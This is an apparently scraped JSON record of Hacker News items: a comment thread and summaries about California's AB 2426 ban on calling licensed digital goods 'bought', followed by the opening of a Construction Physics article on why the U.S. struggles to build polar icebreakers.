    "commentBody": "Sony, Ubisoft scandals lead to California ban on deceptive digital goods sales (arstechnica.com)257 points by BuildWithMason 16 hours agohidepastfavorite101 comments kstrauser 14 hours agoThis is excellent news! Remember, if you buy a copy of a good, you’re entitled to enjoy it as long as you wish to. If the seller steals it back from you, it’s ethical to acquire a replacement copy. The law may say differently, but you cannot convince me that I don’t own something I bought through a “buy” button. I’ve never seen a book or movie or game or album where the button says “License” instead of “Buy”. reply montagg 14 hours agoparent\"Unlock.\" reply kstrauser 14 hours agorootparentAt least that implies that the good is capable of being locked. “Buy” says that I’m buying the thing. reply boltzmann-brain 13 hours agorootparentIndeed, the idea of ownership is a basic natural concept that lawyers are trying to erase with newspeak and nonsensical hidden terms. It's a concept that's been unchanged for millions of years, even before humans existed. If you disagree with me, try taking a bone away from a dog chewing on it. It even goes back to single-cell organisms: even the mitochondrium is just [a cell owned by another cell](https://en.wikipedia.org/wiki/Symbiogenesis). reply dietr1ch 11 hours agorootparentprevAnd can you sell it afterwards? reply ajnin 9 hours agorootparentIf you're in the EU, you can : https://www.clarionsolicitors.com/articles/reselling-used-so... It might be difficult in practice though, with platforms like Steam providing no means to actually resell a game to someone else. reply ozgrakkurt 11 hours agorootparentprevYou should be able to if it is being advertised as “buy”. They should just say gain access to use it or something like that if they are not really selling anything. reply Pedro_Ribeiro 10 hours agorootparentprevThe gaming industry is not ready for that discussion yet, but you absolutely should be able to. reply m01 9 hours agorootparentIt's being discussed in courts, see e.g. https://www.eurogamer.net/french-court-rules-steam-users-hav.... reply 2Gkashmiri 5 hours agorootparentprevcase in point amazon kindle and \"buy\" reply philistine 3 hours agorootparentprev\"Get.\" reply 7e 5 hours agoparentprevWhen you “buy” a concert ticket, are you buying the artist? The venue? The rights to the song? When you click the button labeled “Buy”, you buy a license. You’re not buying the source code, or the company that makes the game, or the copyright, or the website. Almost all words in language have more than one meaning depending on context. Except maybe to you. reply kstrauser 4 hours agorootparentIf I go to an online store and buy a paperback, they will mail me a copy of it that I may keep for the rest of my life. I can read it 100 times if I want to. Before this law, I could go through that exact process to get a e-book, but then they could come back later and revoke my ability to read the e-book that I “bought”. Those two cannot use the same word. They are not the same class of transaction. The latter is more like a rental or lease. They both live behind a “buy” button, though. If I’m told I’m buying an e-book, and the seller later steals it from me by making it unreadable, I have no qualms about obtaining a replacement copy through other channels. I already paid for it; I’m going to have and enjoy it. reply Larrikin 5 hours agorootparentprevYou are buying an experience on that night. Similar to buying food at a restaurant You aren't buying a bad faith argument. reply philistine 3 hours agorootparentNo, you're literally buying an entry ticket. If you were buying an experience, you could sue because the beer was not to your taste. reply alehlopeh 5 hours agoparentprevYou’re asking me to remember something that you explicitly state is your personal opinion? reply s0ss 5 hours agorootparentRather, he’s saying if someone sold something to you, you get to use it. I don’t think any further analysis of this comment will yield anything more. Money can be exchanged for goods and services. (And licenses, but don’t obscure that point in the fine print.) reply HeuristicsCG 12 hours agoparentprevBut you bought a license to use the game. If you had truly bought the game you would be within your legal right to resell it (via copying to 100 people), which you are not. reply jjk166 5 hours agorootparentIf I buy a book, that does not give me the right to print 100 copies of the book and sell them. Indeed if I buy a lawnmower, that does not give me the right to make 100 identical copies and sell them. The right to manufacture something is not a fundamental part of purchasing an individual item. reply npteljes 9 hours agorootparentprev>If you had truly bought the game I think this is the point. We want to truly buy with a Buy action, and license or subscribe with License and Subscribe actions. I'm sure people would be mad even if a Licensed or Subscribed item would cease to work, but it's more honest, than saying that someone Bought something. reply jonhohle 12 hours agorootparentprevYou bought one license to the game which should be resellable exactly once by the purchaser. reply kstrauser 2 hours agorootparentprevI challenge you to find me a major online store where a game's page says you are only buying a license. I just went to https://store.steampowered.com/app/582010/Monster_Hunter_Wor... and the first link says \"Buy Monster Hunter: World\". By every indication, I'm buying it in the same sense I buy a physical book from an online bookseller. Now, fortunately, it's illegal to mislead customers that way. reply baq 12 hours agorootparentprevI like the distinction - pirating isn't stealing, licensing isn't buying. Clear and concise. reply jchw 12 hours agorootparentprevIn the physical world you buy physical copies of things. Certainly in the digital world, you could buy digital copies. reply nkrisc 9 hours agorootparentprevJust like when you buy a book you’re allowed to photocopy it and sell the copies? reply mystified5016 5 hours agorootparentNo, like when you buy a book and the vendor isn't allowed to come into your house and take it away from you with no refund and no recourse. Creating a copy is violation of copyright. Owning a book, reading it, then reselling the copy you own is not. 'Buying' digital goods nowadays means the vendor can take the goods away from you at any time, for any reason, with zero compensation, and absolutely no possible way to recover said goods. reply meowster 14 minutes agorootparent> Creating a copy is violation of copyright Correction: creating a copy that doesn't follow fair use requirements, is a violation of copyright. reply HeuristicsCG 8 hours agorootparentprevBuying a book means buying the paper the book is printed on, the intellectual content (text) is not bought. You are allowed to resell the paper. And you are in fact not buying a license to use a book when you buy a book, you are literally buying the actual physical book. reply jjk166 5 hours agorootparentIf you were buying the paper, then two books of the same page count (even if those pages were blank) would be the same price and interchangeable. They are not. Likewise if you were paying for the paper, then a book with no paper, such as an audiobook, would be free. Again it is not. You are buying some form of media that contains the intellectual content. reply boltzmann-brain 10 hours agorootparentprevthat's like saying if you bought a title to a bridge you would be within your legal right to resell it (via copying the title 100 times with a photo copier). it's all just whatever people agree upon is the correct thing to do, and people don't agree that what you're saying is the correct thing to do. reply HeatrayEnjoyer 7 hours agorootparent>people don't agree that what you're saying is the correct thing to do. Other than the current written law (which is very, very, influenced by corporate lobbyists), how are you coming to this conclusion? reply boltzmann-brain 6 hours agorootparenti wasn't talking about written law, i was talking about what people agree with. the law is something separate from that. reply Daiz 10 hours agoprevExtremely welcome legislation, especially since it has an exception for \"permanent download that can be accessed offline\", ie. DRM-free downloads. It's about time someone actually calls out Big Media on their deceptive practices. As I've been saying for years, it's not \"buying\" with DRM-encumbered media, merely \"renting for an undefined time period\". In fact, it'd be even nicer if the legislation explicitly required rental terminology to be used for anything DRM-encumbered, but well, even as-is, this is an extremely welcome development and I hope legislators worldwide are taking note and plan to follow suit as soon as possible. This kind of victory for digital consumer rights has been long overdue! reply throwaway48476 6 hours agoparentIt's easier to get a 2.0 law passed as the effects are more well understood. reply Sniffnoy 15 hours agoprevHm, wonder if the Stop Killing Games campaign (https://www.stopkillinggames.com/) will be able to make use of this, like they're trying to make use of consumer protection law in France... reply tifik 6 hours agoparentWow, signing that petition was shockingky smooth with my national e-ID. I thought it was just a random petition site, but its an official EU system that verifies your identity. And it just worked with the ID app I have installed. Nice. reply boltzmann-brain 5 hours agorootparentthank you for supporting it! reply boltzmann-brain 14 hours agoparentprevSKG organizer here. Something like this CA legislation was our \"worst case scenario, everything else failed, at least we could do this much, we've compromised on everything\" goal. That is to say, now opponents can't push us to compromise to that level and our worst case scenario in case we pass anything at all is looking better. We're really happy this is happening because it changes the Overton window for us and makes our case stronger and easier to argue for, as you say. A lot of change has been happening in the past few months and even weeks with regards to the market and legislative situation around the problematic of SKG and while you can't ever fully attribute something, we hope that it's thanks to our actions. Ubisoft promising end of life offline modes for The Crew 2 and the third game in the series called Motorfest. Capcom bringing back Windows 7 era games that were lost to G4WL. The \"Ubisoft scandal\" mentioned in the headline - specifically the unforced shutdown and resulting removal of functioning state from The Crew - is something that SKG have no doubt popularized. Now that we're at 350 000 signatures of a goal of 1 000 000 in our direct democracy initiative, companies and lawmakers are starting to take things seriously. And this is with a $0 budget. We're still in need of more signatures over the next 10 months to reach the goal, so if you're an EU citizen, go click the link Sniffnoy posted above and sign. Worth doing even if you're not a gamer, just to claw back some ownership rights from corporations worth billions of dollars, spreading out to all corners of technology, not just games. If you want a very short exposition of what Stop Killing Games is, here's a ~1 minute video: https://www.youtube.com/watch?v=pHGfqef-IqQ If you want a good, exhaustive intro to what SKG is about, this interview between a game developer and two SKG organizers is worth watching: https://www.youtube.com/watch?v=CnpFqPGrgDk Ross Scott is best known for his youtube series \"Freeman's Mind\" where he plays Half-Life and narrates what Gordon Freeman must be thinking, with a lot of deeply philosophical considerations. It's a staple of YouTube. He's also been running a series called \"Dead Game News\" and that's how Stop Killing Games was born. The other organizer, Damian, is a real-deal neckbeard dev and has pretty much done it all from BASIC on 8-bit micros to theorem provers and from video games to cryptography audits. Here's the original intro to Stop Killing Games by Ross: https://www.youtube.com/watch?v=w70Xc9CStoE And here's a subsequent FAQ: https://www.youtube.com/watch?v=sEVBiN5SKuA If anyone has questions about SKG, I'll be checking the replies now and then. reply karambanoonoo 2 hours agorootparent> Capcom bringing back Windows 7 era games that were lost to G4WL. At the same time adding the most invasive DRM to even their much older games. Lol, thanks for nothing, you can go. reply ewuhic 5 hours agorootparentprevDoes it work for citizens only, or legal residence also applies? Btw, I'm not sure you should show a cookie banner if you're not tracking people. But you must be more knowledgeable than me. reply boltzmann-brain 5 hours agorootparentCitizens only, and anywhere in the world. If you're not a citizen but are a resident, you can support in another way - go to your friends who are EU citizens and ask them to sign! Even if they're not gamers, remember that it's about ownership in general. There are many other things that can and are being remotely shut down, such as cars, trains, implants for disabled people, etc. This is just the first step in regaining ownership of things you buy. Try asking a few people for support! reply hnsaccount 2 hours agorootparentprevNo need to show a cookie banner if you are not placing cookies or trackers. But now that AB 2426 has become law, it moves more in line towards GDPR in terms of transparency. E.g. you have to be transparent of using licenses etc. What I really like about this new law is that it makes (or should make) it easier to unsubscribe. Just Google how difficult it is to unsubscribe several major SaaS players, like e.g. Semrush on SEO. Good luck being compliant to AB 2426 with that 6-10 step! reply squigz 13 hours agorootparentprevThanks for the work you and others at SKG are doing o7 reply boltzmann-brain 13 hours agorootparentyou're welcome - if you want to thank us, convince one EU citizen to sign the initiative! reply squigz 13 hours agorootparentI will do that while making sad Canadian sounds :P Also, might I recommend adding embed information to the website so linking it on i.e., Discord shows some information? reply boltzmann-brain 13 hours agorootparentThank you! Regarding embed information, that's a great idea and I'll pass it on. reply Negitivefrags 7 hours agorootparentprevI can’t view a video at the moment, so I apologise if this has been answered in that. If the server software a game uses requires a licence to a third party library, what is the developer expected to do about that? reply boltzmann-brain 6 hours agorootparentIf the EU decides to build any legislation around SKG, they will give developers ample warning before things go into effect. Apple had years to prepare for USB C. This is still years out. So the answer is: negotiate compatible terms, or don't use the third party library. This is merely an issue to begin with for companies that are absolutely massive, like Sony or Activision. Smaller developers just don't do stuff like that in general: you download the game and then you have the game. Since the ask is for a reasonably working game, maybe as a developer in that position you can just cut out the functionality that depends on the library or replace the library with something similar or mock it out or use a static cache of request vs response for all possible requests. The technological possibilities are endless. It's not like as developers we're these helpless infants who have never solved a problem in our lives. It's a tech problem, tech a solution to it, that's why you're a professional and not bush league. Ultimately if someone can't figure out how to do their business without scamming people out of ownership then that's a skill issue. If they're not creative enough to figure it out, the business is doomed to begin with. Legislation often has the additional positive effect of ridding the market of people who shouldn't be there to begin with, like food trucks infested with cockroaches and pizza places that use fake cheese. reply maccard 5 hours agorootparent> It's a tech problem, tech a solution to it, Except it's not - it's a business problem. SKG would essentially ban the use of Oracle as an example. Or it would likely kill games like Rock band which have licensed audio. You might be ok with that, but why are your preferences more important than mine. > This is merely an issue to begin with for companies that are absolutely massive, like Sony or Activision. Smaller developers just don't do stuff like that in general This is a naive viewpoint IMO. Another way of looking at it is that only large companies will be able to conform and this will squeeze out the possibility of small developers having multiplayer games. This sort of red-tape stifles innovation. reply FroshKiller 5 hours agorootparentSmall developers have multiplayer games all the time that aren't affected by issues like the ones SKG is concerned with. Ad-hoc multiplayer and dedicated servers that players can self-host are long-established solutions. A common argument in bad faith is that SKG demands perpetual upkeep of presumed infrastructure that will somehow harm small developers, and it just isn't true. reply boltzmann-brain 4 hours agorootparentTo be fair they didn't make that argument, but thanks for the support none the less! Agreed, ad-hoc servers are a staple and a worked out problem. 99% of the time you have to go out of your way as a developer to make things not work in this way. reply boltzmann-brain 5 hours agorootparentprev> Except it's not - it's a business problem. SKG would essentially ban the use of Oracle as an example why are you using Oracle for video games? what's wrong with you? > Or it would likely kill games like Rock band which have licensed audio. Rock Band DOES work offline. Licensed audio in Rock Band is licensed in such a way that once a copy is sold the license allows the use of that copy in perpetuity. 100 years from now I'll still be able to pop in my Rock Band disc and play it, because that's how ownership works and the developer didn't get in the way of my ownership of my own property. But when I said \"It's a tech problem\" I was answering someone who mentioned a tech problem. Coming up with a different, non-tech problem as a counter-point to a whole discussion exclusively about a tech problem is not as smart as you think it is, and the examples you bring up aren't very good at all. > Another way of looking at it is that only large companies will be able to conform No, that's unmitigated nonsense. Just your first paragraph showed you have no idea what you're talking about, but now you're just stringing words together. The reason why only the largest companies can have these problems in the first place is because of their legacy technology integrations and pre-existing technology supplier agreements which they would have to re-negotiate. Remember, this is a scenario AFTER the initiative gets a million signatures, which is a year out, and AFTER the EU has legislated, which is another year at least, and AFTER the warning period which is several years. Even with the fastest possible timeline it's probably like 5 years of warning that things are going to change. And at that point anyone entering the space from the bottom as a new player is free to negotiate a deal which conforms with the market regulations going forward; if the technology suppliers don't want to negotiate realistic terms, they go out of business. While we're at it, large companies are also free to renegotiate their contracts to make them legal in the eyes of the legislation because contract survival terms are a standard staple in any technology supply agreement and if changes to market regulations make a contract unfit or illegal then renegotiations commence as a matter of course. But given the timeline of this going into effect they'll have renegotiated YEARS ahead of the deadlines. This isn't a twitter poll. It's not going to go into effect 5 minutes after it's been posted. There will be AMPLE time for everyone to figure stuff out and change their paperwork, and the only companies really affected are the ones that already spend $1M+/year on legal anyways. reply maccard 4 hours agorootparent> why are you using Oracle for video games? what's wrong with you? Because my previous project used it. It's an example. There are plenty of others. And I think this sort of attitude is unfair towards people like me who genuinely want to preserve video games, but are concerned that an ideological battle is going to negatively affect the industry. > Licensed audio is licensed in such a way that once a copy is sold the license allows the use of that copy in perpetuity. Licensed audio can be licensed in such a way. GTA being a great example of something that doesn't have perpetual licenses to their music. > Coming up with a different, non-tech problem as a counter-point to a whole discussion exclusively about a tech problem is not as smart as you think it is > no, that's unmitigated nonsense. Just your first paragraph showed you have no idea what you're talking about, but now you're just stringing words together. In three paragraphs, you've attacked me three times, when there's no need to have done. If you can't have civil discourse, I'm not interested in discussing this with you. reply jagermo 6 hours agorootparentprevsigned already and thank you all for your hard work. reply boltzmann-brain 5 hours agorootparentThank you for your service! If you want to support even more, feel free to talk to others about it! reply szastamasta 12 hours agoprevMaybe I have misunderstood the article, but for me it looks like another „cookies” law. They are not proposing to force media companies to make sure you have access to your media forever. Or force them to give you a downloadable copy when they remove media from store. They’ll just replace „Buy” button with „Get Access” or whatever and add some lawyer mumbo-jumbo above it. Looks like a smokescreen to me. reply diggan 10 hours agoparent> They’ll just replace „Buy” button with „Get Access” or whatever and add some lawyer mumbo-jumbo above it. Sounds like exactly what is needed? Consumers currently think they're buying something when they click a button that says \"Buy\", when in reality they're getting temporary access to it. Forcing companies to use clear language might change consumer behavior, or it might not, but at least it's no longer explicitly misleading. reply wodenokoto 11 hours agoparentprev> make sure you have access to your media forever. No, they are trying to make sure that companies don't tell you something is yours that isn't. > They’ll just replace „Buy” button with „Get Access” or whatever and add some lawyer mumbo-jumbo above it. Forbidding that would require forbidding rentals. reply ZaoLahma 7 hours agoparentprevMentally it's not too difficult to throw $60 at a digital \"Buy\" button, but it's much harder to throw those $60 at a \"Get access\" button. I wholly welcome a change like this, even if it's just wording on the button. One thing to worry about, perhaps, is how it might make it easier for companies to remove things that we have \"Gotten access\" to as it would be explicitly stated that we don't actually buy anything. reply ben-schaaf 5 hours agorootparent> Mentally it's not too difficult to throw $60 at a digital \"Buy\" button, but it's much harder to throw those $60 at a \"Get access\" button. This is especially true when a large number of games do have a buy button. \"Get access\" stands out as not being the same as buying when you've bought the rest of your game library. reply beretguy 7 hours agorootparentprev> One thing to worry about, perhaps, is how it might make it easier for companies to remove things that we have \"Gotten access\" to They are already doing it. The Crew is a good example. We are not losing anything here. reply ZaoLahma 6 hours agorootparentYes, but up until now it's been (very) rare. At least for games. I fear that companies will view a change like this as a door opening wider to remove digital content as they please. Or perhaps worse, only offer strictly time-limited access with a \"well, you're getting exactly what you asked for\" view of it. reply beretguy 5 hours agorootparentIt's not rare at all. It happens all the time, everywhere. There are hundreds of games nobody can play anymore because servers got shutdown. reply dgoldstein0 11 hours agoparentprevThey'll either have to change the text in which case digital good sales will be more honest, or they won't want to change the text and therefore will actually commit to letting us download and keep our own copies without interference. Both sound like wins to me. Just TBD which variant ends up more common. reply szastamasta 11 hours agorootparentYou see, I just don’t think more honest wins us anything. I’ve seen too many „We value your privacy” popups already. reply beart 6 hours agorootparentI think the old adage, \"don't let perfect be the enemy of good\" applies here. Some battles are fought one excruciating step at a time reply beretguy 7 hours agorootparentprevWhat do you mean? What do privacy pop ups have to do with this? reply szastamasta 7 hours agorootparentIt’s just like with cookies. I believe that lawmakers were honest and really wanted for companies to limit amount of tracking in the web. What we did get instead is a lot of „we value your privacy” popups and 5 pages of checkboxes to check if you don’t want to be tracked. I just think that this will end up the same way. Nothing really changes, but we’ll just get more useless „lawyer talk” in more and more license documents to click on. reply throwaway48476 6 hours agorootparentInstead of hidden sleaze it's now very much in your face. reply beretguy 5 hours agorootparentprev> I just think that this will end up the same way. What will change is that I will know not to buy games that don't have \"Buy\" button. reply nkrisc 8 hours agoparentprevThat’s the point. It’s a step in the right direction. This law is aimed at preventing deception at point of sale. It doesn’t target business practices. reply robertclaus 13 hours agoprevIt does feel like a lot of this enforcement will need to be in the spirit of the law and/or general deterrence. I would assume any sufficiently specific law in this space would be fairly easy to find a loophole or workaround for in your UI. reply amne 13 hours agoparentLike having a button that says \"Rent\" instead of \"Buy\"? That would be crazy reply rlayton2 7 hours agorootparentProbably something like \"Buy a pass to play\" reply beretguy 7 hours agorootparentSounds good. I’ll know not to ever press that button. reply 0xffff2 1 hour agorootparentDo you play paid video games now? Do you plan to stop? The idea that this law is going to cause anyone to actually change how they license games is laughable. reply blackeyeblitzar 12 hours agoprevOwnership always had a meaning. Selling things for purchase and then treating it as a limited license is fraud. Even under existing law. How about we hold all these companies accountable for the rug pull? reply boltzmann-brain 6 hours agoparentThat's what Stop Killing Games is trying to do via cooperation with DGCCRF and other consumer agencies. If you like that, go to their website and learn how to support them. reply pjmlp 7 hours agoprevGreat, hope this extends elsewhere. reply Me000 5 hours agoprevThis is amazing, thank god people are fighting for my rights. reply riiii 11 hours agoprevImagine writing so awful and unethical software that it triggers law to be created to ban it. reply givemeethekeys 14 hours agoprevDo they charge / pay sales tax on in-game purchases? reply boltzmann-brain 13 hours agoparentthe purchase of in-game items or currencies is a purchase like any other. reply simoncion 15 hours agoprevIf I'm reading the text of the law correctly [0], this does not go nearly far enough. (b)(2)(A) seems to say that all an entity needs to do to comply with the law is to add a checkbox associated with some text that links to the EULA for the software, and also says \"By checking this box, you acknowledge that you have read the EULA and know that access to the software will be revoked if you no longer hold a right to the software\". Most folks are never going to read the EULA, and no reasonable person would expect that a button that says \"BUY\" would seal a deal that permits the \"seller\" to unilaterally revoke the customer's right to the \"sold\" software. [0]reply ccvannorman 14 hours agoparentThis is incorrect. Links to EULA are not enough, it must be separate and distinct from any other terms. Words like \"BUY\" are also expressly forbidden. Quoted from the link in parent comment ( https://legiscan.com/CA/text/AB2426/id/2966792 ) - (1) It shall be unlawful for a person to advertise or offer for sale a digital good with the terms “buy,” “purchase,” or any other term which a reasonable person would understand to confer an unrestricted ownership interest (B) The affirmative acknowledgment from the purchaser pursuant to subparagraph (A) shall be distinct and separate from any other terms and conditions of the transaction that the purchaser acknowledges or agrees to. reply idle_zealot 14 hours agorootparentThat's interesting. I don't for a second think this will actually curtail the harmful business practices, but what do you recon they'll write on their buttons? Maybe just dance around any meaningful verbiage with a button that just has a dollar sign or shopping cart on it? Just \"Proceed\" or \"Confirm\"? reply andyferris 14 hours agorootparent“Get” is already used on iOS for this purpose. reply tiltowait 14 hours agorootparent“Get” replaced “free”, because it was misleading to call apps free when most have in-app purchases. reply beretguy 7 hours agorootparent“Get” sounds good to me. I’ll know not to get any games that have “Get” button. Hopefully this law spreads to Steam across the board so that people outside of California can also benefit from it. reply vrighter 14 hours agorootparentprev\"add to cart\" and \"checkout\" reply summermusic 9 hours agorootparentI’d argue that a reasonable person would understand these terms to confer an unrestricted ownership interest. I’m putting this good into a metaphorical container and taking it to a metaphorical till. This implies a sort of tangibility, a property of physical goods that I’d walk out of the metaphorical store to own. reply kstrauser 3 hours agorootparentThat’s a good point. The real world experience they’re analogizing is me putting a bottle of ketchup in a shopping cart at a grocery store and checking out at the cashier. Afterward, I own that bottle of ketchup, not a license to ketchup, but that instance of it. “Shopping cart” and “checkout” imply “buying”, and I can’t think of a counterexample. reply simoncion 14 hours agorootparentprev> Words like \"BUY\" are also expressly forbidden. I strongly disagree. (b)(1) says that \"buy\" is not permitted for these goods... EXCEPT (b)(2)(A) says that it IS permitted, if you follow the rules in subsections i through iii. > (2) (A) Notwithstanding paragraph (1), a person may advertise or offer for sale a digital good with the terms “buy,” “purchase,” or any other term which a reasonable person would understand to confer an unrestricted ownership interest in the digital good, or alongside an option for a time-limited rental, if the seller receives at the time of each transaction an affirmative acknowledgment from the purchaser of all of the following: My read on that is that either (b)(1) controls and you cannot use the words \"buy\" and friends, OR you do the things in (b)(2) and you CAN use \"buy\" & etc. My read on subsection (ii) when combined with (i) is that simply \"providing\" the EULA for a digital software download and making the customer tick a box saying that they've \"received\" the EULA would be sufficient. If it's not (and it might not be), then having them scroll through the whole EULA to \"prove\" that they read it would clearly be sufficient, as it's common practice. > (B) The affirmative acknowledgment from the purchaser pursuant to subparagraph (A) shall be distinct and separate from any other terms and conditions of the transaction that the purchaser acknowledges or agrees to. Yes, but I think that this just means that this acknowledgement is a thing that's separate from the EULA, and separate from extended warranties, and such. The language that says that the customer must acknowledge that they received the license for the thing they're \"purchasing\" indicates that they must be -at minimum- given a chance to read the EULA... and I'm pretty sure common practice is to either provide a link to the EULA, or force you to scroll through it. reply wruza 12 hours agorootparentprevThat’s so naive. They’ll just replace terminology industry-wise and continue on the wave of irony about it. Feels like regulators never were in kindergarten or at least school, could be a freshening experience for them, cause it all works like there. reply tpxl 12 hours agorootparentReplacing the terminology is the first step to this methinks. You'll always be able to buy a bagel, but not a video game. It's still shitty, but it's not deceptively shitty. reply 99112000 8 hours agoprev [–] Did they have to add a label that the goods may give them cancer? reply lesuorac 4 hours agoparentIt's weird how a smaller provision of a much larger work (Safe Drinking Water and Toxic Enforcement Act of 1986) are always trotted out as an argument against regulation. Like if you can't use the majority of the regulation in an argument against it, perhaps it's good regulation. Although to the actually very narrow point raised, would you rather not know what substances were bad for you? Perhaps a lot of this is pointless as you will commonly see people saw materials without masks but at the same point would you buy carrots labeled with \"This product is known to the state of CA to cause cancer?\". And to the rest of the regulation that isn't address by OP. It is very good that companies cannot just dump their cancerous waste materials into rivers. reply beretguy 7 hours agoparentprev [–] What is this comment in relation to? reply tlhunter 6 hours agorootparent [–] California prop 65 reply beretguy 5 hours agorootparent [–] And how is that related to the post? reply 0xffff2 1 hour agorootparent [–] Prop 65 notices are a useless warning because they are slapped on anything and everything, just like this new law will result in a useless checkbox that people click without thinking. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "California has enacted AB 2426, the first law to ban deceptive sales of \"disappearing media,\" requiring clear disclosure when digital goods are temporary licenses rather than outright purchases.",
      "The law, signed by Governor Gavin Newsom and sponsored by Assemblymember Jacqui Irwin, aims to protect consumers from unexpectedly losing access to digital content like books, movies, and video games.",
      "Prompted by incidents with Ubisoft and Sony, the law mandates clear labeling and prohibits hiding disclosures in terms of service, with exceptions for goods advertised as licenses and subscription services."
    ],
    "commentSummary": [
      "California has enacted a law banning deceptive digital goods sales, targeting misleading terms like \"buy\" unless permanent access is provided.",
      "The law mandates clear language to differentiate between purchasing and licensing digital goods, aiming to prevent consumer confusion.",
      "This legislation is considered a win for digital consumer rights, promoting transparency and honesty in digital transactions."
    ],
    "points": 257,
    "commentCount": 101,
    "retryCount": 0,
    "time": 1727402897
  },
  {
    "id": 41662831,
    "title": "Why the U.S. can't build icebreaking ships",
    "originLink": "https://www.construction-physics.com/p/why-the-us-cant-build-icebreaking",
    "originBody": "Share this post Why the U.S. Can’t Build Icebreaking Ships www.construction-physics.com Copy link Facebook Email Note Other Why the U.S. Can’t Build Icebreaking Ships Brian Potter Sep 26, 2024 106 Share this post Why the U.S. Can’t Build Icebreaking Ships www.construction-physics.com Copy link Facebook Email Note Other 31 Share USCG Polar Star I want to say thank you to all the people who sent condolences following last week’s post, especially those who shared their own stories of loss. I was not able to respond to every single one, but my wife and I took great comfort from reading them. - The U.S. has interests in regions all around the globe. Perhaps none are more remote than the polar region: areas near or in the Arctic and Antarctic Circles. Roughly 1/3rd of Alaska is within the Arctic Circle, and though only around 4% of Alaska citizens live there, that’s still tens of thousands of people. There are also significant natural resources in U.S. Arctic territory, including untapped oil and gas deposits, the largest zinc mine in the world, and (potentially) minerals on the Arctic seabed, such as “gold, silver, copper, iron, lead, manganese, nickel, platinum, tin, zinc, and diamonds.” In the Antarctic, the U.S. operates three research facilities: McMurdo Station, Amundsen-Scott South Pole Station, and Palmer Station. McMurdo Station is the largest research station in Antarctica, with a population of up to 1,000 people (20-25% of Antarctica’s total population). The U.S. isn’t the only country with major polar interests. Roughly four million people around the world live above the Arctic Circle. Russia has 15,000 miles of coastline along the Arctic ocean, and an estimated 10-20% of Russia’s GDP comes from activities above the Arctic Circle. And as climate change reduces the extent of sea ice and makes polar regions more accessible, international interest in the polar regions is expected to increase. In 2014, Xi Jinping stated that China planned on joining the ranks of “the great polar powers,” and in 2023 Russia and China sent a naval force to patrol near the coast of Alaska. By shipping goods through shorter, previously inaccessible Arctic Ocean routes, China could potentially reduce its ocean-based transportation costs by 40%, saving hundreds of billions of dollars per year. Travel times from Shanghai to Hamburg, via The Economist. Because polar bodies of water are often covered in ice, accessing these regions by ship requires specially designed ships which can break up the ice and create a path for other ships to follow. The need for icebreaking vessels will remain even as climate change reduces the extent of sea ice: paradoxically, as new polar routes become accessible and sea ice becomes more mobile, the demand for icebreakers is likely to increase. Russia has an aging fleet of more than 40 icebreakers, with several under construction. China has somewhere between 5 and 7 icebreakers (depending on exactly how you define “icebreaker”), with more under construction.1 The U.S., on the other hand, has allowed its icebreaking capabilities to wither. The Coast Guard has handled all U.S. icebreaking since 1966, and estimates that it needs 8-9 polar icebreakers (4-5 heavy and 4-5 medium) to fulfill its needs. But it currently has only two: the heavy icebreaker Polar Star, and the medium icebreaker Healy. The U.S. hasn’t built a heavy icebreaker since 1976. In fact, no existing U.S. shipyard has built a heavy polar icebreaker since before 1970. A 2017 National Academies report stated that “The nation is ill-equipped to protect its interests and maintain leadership in these regions and has fallen behind other Arctic nations, which have mobilized to expand their access to ice-covered regions.” And while the U.S. is trying to remedy this with a Polar Security Cutter program to build a series of new heavy polar icebreakers (to be followed by a series of medium icebreakers), the program is going poorly. When the contract was first awarded in 2019, the plan was to have the first icebreaker completed by 2024. But as of July this year, the design of the ship was still incomplete. If and when the ships are completed (currently 2029 for the first vessel at the earliest), they are expected to cost $1.7-1.9 billion apiece, roughly four to five times what a comparable ship would cost to build elsewhere. Icebreakers, then, are another unfortunate example of the costs inflicted by binding national interests to an inefficient shipbuilding industry. How an icebreaker works An icebreaker is exactly what it sounds like; a ship designed to break up ice, either to create a passage for itself or to create a channel for other ships to follow. A ship might be designed primarily for icebreaking (like the Polar Star) or designed for icebreaking and other duties. The French Le Commandant Charcot is a cruise ship with icebreaking capabilities. Modern icebreakers are rated based on their ability to break through ice and operate in various ice conditions. Higher-rated icebreakers can continuously break through ice nearly 10 feet thick, and can ram through even thicker ice. Breaking ice requires a host of specific design features. Traditional icebreakers pair high-powered engines with specially shaped hulls designed to create downward pressure over the top of the ice, breaking it apart under high tensile forces, as ice is weak in tension. For particularly thick ice, or ice ridges, the entire front of the icebreaker may be driven up onto the ice, breaking the ice beneath it. The hull and ship structure must be strong enough to withstand the impact of ice, and a heavily reinforced “ice-belt,” often made of special high-strength steel, is installed near the level of the waterline. Things like air bubbler systems (which blow bubbles of air up around the ship from beneath the water) and low-friction paint reduce friction as the ship forces its way through the ice. Traditional icebreaking hull shapes, while well suited to breaking through ice, perform poorly in open ocean operations; the Polar Star has been dubbed “The Polar Roller” due to its tendency to roll constantly. The development of rotatable “azimuth” thrusters in the late 1980s, sometimes known as azipods, changed the mechanics of icebreaking. Icebreaking ships with azimuth thrusters are often designed to break ice by moving backwards, using the propellers to break ice from below and to flush the hull with water to reduce friction. Not only does this reduce the power required to break ice, but it allows for the front (bow) of the ship to be designed for better open water performance. Some modern icebreakers are designed to use azimuth thrusters to move forward at an oblique angle to create an especially wide channel. Azimuth thrusters. The specialized design requirements and equipment make icebreaker ship design and construction a specialized field of expertise. A relatively small number of shipbuilders are responsible for the lion’s share of icebreaker design and construction. By far the most experienced icebreaker builder in the world is Finland. Because Finland’s entire coast can freeze during the winter, and because Finland depends on sea transport for over 90% of its imports and exports, it maintains a large fleet of Baltic icebreakers to keep shipping channels open. As a result, Finland has developed unrivaled expertise in icebreaker construction. Finnish firms have designed roughly 80% of the world’s icebreakers and built 60% of them. Hypothetical hull structure for an icebreaking vs non-icebreaking ship, via GAO. History of U.S. icebreakers Ships designed to break up ice became possible with the advent of steam power. The U.S. built the first icebreaker in the world, the steam powered City Ice Boat No. 1, in Philadelphia in 1837 to break ice on the Delaware River. Icebreakers designed to operate in the arctic were built as early as 1898 in Russia with the Yermak, but the U.S. didn’t acquire oceangoing icebreaking ships until 1942 with the light icebreaker Storis, which became the first U.S. ship to traverse the Northwest Passage. The Storis’ icebreaking capabilities were minimal (one source described the ship as “dainty”), and America’s first true icebreakers were the subsequent Wind-class ships. Built at the behest of President Roosevelt, who asked for “the world’s greatest icebreakers” to help support air bases in Greenland and to help transport lend-lease cargo to Russia’s Arkhangelsk port, the U.S. built eight Wind-class icebreakers between 1942 and 1946. 